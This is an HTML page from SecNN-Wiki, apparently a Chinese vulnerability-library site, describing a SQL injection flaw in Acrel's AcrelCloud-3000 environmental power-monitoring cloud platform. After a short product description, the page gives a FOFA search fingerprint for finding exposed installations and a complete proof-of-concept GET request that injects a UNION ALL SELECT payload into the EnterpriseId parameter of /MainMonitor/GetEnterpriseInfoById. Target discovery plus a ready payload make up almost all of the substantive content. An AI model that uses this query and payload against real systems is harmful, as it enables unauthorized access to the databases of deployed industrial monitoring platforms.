@@ -1,0 +1,141 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="内部使用">
+    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E5%AE%89%E7%A7%91%E7%91%9E/%E5%AE%89%E7%A7%91%E7%91%9E%E7%8E%AF%E4%BF%9D%E7%94%A8%E7%94%B5%E7%9B%91%E7%AE%A1%E4%BA%91%E5%B9%B3%E5%8F%B0GetEnterpriseInfoById%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/">
+    <link rel="shortcut icon" href="../../../favicon.ico">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>安科瑞环保用电监管云平台GetEnterpriseInfoById存在SQL注入漏洞 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
+    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "\u5b89\u79d1\u745e\u73af\u4fdd\u7528\u7535\u76d1\u7ba1\u4e91\u5e73\u53f0GetEnterpriseInfoById\u5b58\u5728SQL\u6ce8\u5165\u6f0f\u6d1e", url: "#_top", children: [
+              {title: "fofa", url: "#fofa" },
+              {title: "poc", url: "#poc" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../../js/base.js"></script>
+      <script src="../../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../%E5%AE%89%E7%A7%91%E7%91%9E%E7%8E%AF%E4%BF%9D%E7%94%A8%E7%94%B5%E7%9B%91%E7%AE%A1%E4%BA%91%E5%B9%B3%E5%8F%B0etEnterpriseInfoY%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../%E5%AE%89%E7%A7%91%E7%91%9E%E7%8E%AF%E4%BF%9D%E7%94%A8%E7%94%B5%E7%9B%91%E7%AE%A1%E4%BA%91%E5%B9%B3%E5%8F%B0etEnterpriseInfoY%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        安科瑞环保用电监管云平台etEnterpriseInfoY存在SQL注入漏洞
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../%E5%AE%89%E7%9B%9F%E5%8D%8E%E5%BE%A1/%E5%AE%89%E7%9B%9F%E5%8D%8E%E5%BE%A1%E5%BA%94%E7%94%A8%E9%98%B2%E6%8A%A4%E7%B3%BB%E7%BB%9Fsslvpn_client%E5%AD%98%E5%9C%A8%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../%E5%AE%89%E7%9B%9F%E5%8D%8E%E5%BE%A1/%E5%AE%89%E7%9B%9F%E5%8D%8E%E5%BE%A1%E5%BA%94%E7%94%A8%E9%98%B2%E6%8A%A4%E7%B3%BB%E7%BB%9Fsslvpn_client%E5%AD%98%E5%9C%A8%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        安盟华御应用防护系统sslvpn_client存在远程命令执行漏洞
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="getenterpriseinfobyidsql">安科瑞环保用电监管云平台GetEnterpriseInfoById存在SQL注入漏洞<a class="headerlink" href="#getenterpriseinfobyidsql" title="Permanent link">&para;</a></h1>
+<p>AcrelCloud-3000环保用电监管云平台依托创新的物联网电力传感技术，实时采集企业总用电、生产设备及环保治理设备用电数据，通过关联分析、超限分析、停电分析、停限产分析，结合及时发现环保治理设备未开启、异常关闭及减速、空转、降频等异常情况，同时通过数据分析还可以实时监控限产和停产整治企业运行状态，用户可以利用PC、手机、平板电脑等多种终端实现对平台的访问。</p>
+<h2 id="fofa">fofa<a class="headerlink" href="#fofa" title="Permanent link">&para;</a></h2>
+<div class="highlight"><pre><span></span><code><span class="nx">body</span><span class="o">=</span><span class="s2">&quot;myCss/phone.css&quot;</span>
+</code></pre></div>
+<h2 id="poc">poc<a class="headerlink" href="#poc" title="Permanent link">&para;</a></h2>
+<div class="highlight"><pre><span></span><code><span class="nx">GET</span><span class="w"> </span><span class="o">/</span><span class="nx">MainMonitor</span><span class="o">/</span><span class="nx">GetEnterpriseInfoById</span><span class="o">?</span><span class="nx">EnterpriseId</span><span class="o">=%</span><span class="mf">27</span><span class="o">+</span><span class="nx">UNION</span><span class="o">+</span><span class="nx">ALL</span><span class="o">+</span><span class="nx">SELECT</span><span class="o">+</span><span class="nx">NULL</span><span class="o">%</span><span class="mf">2</span><span class="nx">CNULL</span><span class="o">%</span><span class="mf">2</span><span class="nx">CNULL</span><span class="o">%</span><span class="mf">2</span><span class="nx">CNULL</span><span class="o">%</span><span class="mf">2</span><span class="nx">CNULL</span><span class="o">%</span><span class="mf">2</span><span class="nx">CNULL</span><span class="o">%</span><span class="mf">2</span><span class="nx">CNULL</span><span class="o">%</span><span class="mf">2</span><span class="nx">CNULL</span><span class="o">%</span><span class="mf">2</span><span class="nx">CNULL</span><span class="o">%</span><span class="mf">2</span><span class="nx">CNULL</span><span class="o">%</span><span class="mf">2</span><span class="nx">CNULL</span><span class="o">%</span><span class="mf">2</span><span class="nx">CNULL</span><span class="o">%</span><span class="mf">2</span><span class="nx">CNULL</span><span class="o">%</span><span class="mf">2</span><span class="nx">CNULL</span><span class="o">%</span><span class="mf">2</span><span class="nx">CNULL</span><span class="o">%</span><span class="mf">2</span><span class="nx">CNULL</span><span class="o">%</span><span class="mf">2</span><span class="nx">CNULL</span><span class="o">%</span><span class="mf">2</span><span class="nx">CNULL</span><span class="o">%</span><span class="mf">2</span><span class="nx">CNULL</span><span class="o">%</span><span class="mf">2</span><span class="nx">CNULL</span><span class="o">%</span><span class="mf">2</span><span class="nx">CNULL</span><span class="o">%</span><span class="mf">2</span><span class="nx">CNULL</span><span class="o">%</span><span class="mf">2</span><span class="nx">CNULL</span><span class="o">%</span><span class="mf">2</span><span class="nx">CCONCAT</span><span class="o">%</span><span class="mf">280</span><span class="nx">x716a627871</span><span class="o">%</span><span class="mf">2</span><span class="nx">C0x647a457071654e45644d4c627a716c4d7948505a4d67756a786c70576a5a4f7749627a5449486562</span><span class="o">%</span><span class="mf">2</span><span class="nx">C0x7178767171</span><span class="o">%</span><span class="mf">29</span><span class="o">%</span><span class="mf">2</span><span class="nx">CNULL</span><span class="o">%</span><span class="mf">2</span><span class="nx">CNULL</span><span class="o">%</span><span class="mf">2</span><span class="nx">CNULL</span><span class="o">%</span><span class="mf">2</span><span class="nx">CNULL</span><span class="o">%</span><span class="mf">2</span><span class="nx">CNULL</span><span class="o">%</span><span class="mf">2</span><span class="nx">CNULL</span><span class="o">%</span><span class="mf">2</span><span class="nx">CNULL</span><span class="o">%</span><span class="mf">2</span><span class="nx">CNULL</span><span class="o">%</span><span class="mf">2</span><span class="nx">CNULL</span><span class="o">%</span><span class="mf">23</span><span class="w"> </span><span class="nx">HTTP</span><span class="o">/</span><span class="mf">1.1</span>
+<span class="nx">Host</span><span class="o">:</span><span class="w"> </span>
+<span class="nx">User</span><span class="o">-</span><span class="nx">Agent</span><span class="o">:</span><span class="w"> </span><span class="nx">Mozilla</span><span class="o">/</span><span class="mf">5.0</span><span class="w"> </span><span class="p">(</span><span class="nx">Windows</span><span class="w"> </span><span class="nx">NT</span><span class="w"> </span><span class="mf">10.0</span><span class="p">;</span><span class="w"> </span><span class="nx">Win64</span><span class="p">;</span><span class="w"> </span><span class="nx">x64</span><span class="p">)</span><span class="w"> </span><span class="nx">AppleWebKit</span><span class="o">/</span><span class="mf">537.36</span><span class="w"> </span><span class="p">(</span><span class="nx">KHTML</span><span class="p">,</span><span class="w"> </span><span class="nx">like</span><span class="w"> </span><span class="nx">Gecko</span><span class="p">)</span><span class="w"> </span><span class="nx">Chrome</span><span class="o">/</span><span class="mf">126.0.0.0</span><span class="w"> </span><span class="nx">Safari</span><span class="o">/</span><span class="mf">537.36</span>
+<span class="nx">Accept</span><span class="o">:</span><span class="w"> </span><span class="o">*</span><span class="err">/*</span>
+<span class="nx">Accept</span><span class="o">-</span><span class="nx">Encoding</span><span class="o">:</span><span class="w"> </span><span class="nx">gzip</span><span class="p">,</span><span class="w"> </span><span class="nx">deflate</span>
+<span class="nx">Accept</span><span class="o">-</span><span class="nx">Language</span><span class="o">:</span><span class="w"> </span><span class="nx">zh</span><span class="o">-</span><span class="nx">CN</span><span class="p">,</span><span class="nx">zh</span><span class="p">;</span><span class="nx">q</span><span class="o">=</span><span class="mf">0.9</span>
+<span class="nx">Connection</span><span class="o">:</span><span class="w"> </span><span class="nx">close</span>
+</code></pre></div>
+<p><img alt="image-20241128094044951" src="https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202411280940008.png" /></p>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../%E5%AE%89%E7%A7%91%E7%91%9E%E7%8E%AF%E4%BF%9D%E7%94%A8%E7%94%B5%E7%9B%91%E7%AE%A1%E4%BA%91%E5%B9%B3%E5%8F%B0etEnterpriseInfoY%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../%E5%AE%89%E7%A7%91%E7%91%9E%E7%8E%AF%E4%BF%9D%E7%94%A8%E7%94%B5%E7%9B%91%E7%AE%A1%E4%BA%91%E5%B9%B3%E5%8F%B0etEnterpriseInfoY%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        安科瑞环保用电监管云平台etEnterpriseInfoY存在SQL注入漏洞
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../%E5%AE%89%E7%9B%9F%E5%8D%8E%E5%BE%A1/%E5%AE%89%E7%9B%9F%E5%8D%8E%E5%BE%A1%E5%BA%94%E7%94%A8%E9%98%B2%E6%8A%A4%E7%B3%BB%E7%BB%9Fsslvpn_client%E5%AD%98%E5%9C%A8%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../%E5%AE%89%E7%9B%9F%E5%8D%8E%E5%BE%A1/%E5%AE%89%E7%9B%9F%E5%8D%8E%E5%BE%A1%E5%BA%94%E7%94%A8%E9%98%B2%E6%8A%A4%E7%B3%BB%E7%BB%9Fsslvpn_client%E5%AD%98%E5%9C%A8%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        安盟华御应用防护系统sslvpn_client存在远程命令执行漏洞
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
+</footer>
+
+</body>
+</html>
